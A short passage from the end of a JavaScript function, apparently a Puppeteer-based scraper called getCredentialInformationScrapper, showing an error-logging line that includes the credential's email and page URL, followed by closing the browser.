      `getCredentialInformationScrapper ERROR: ${error} || EMAIL:${
        credential.email
      } || URL: ${page.url()}`,
    );
  } finally {
    await _browser.close();
  }
};
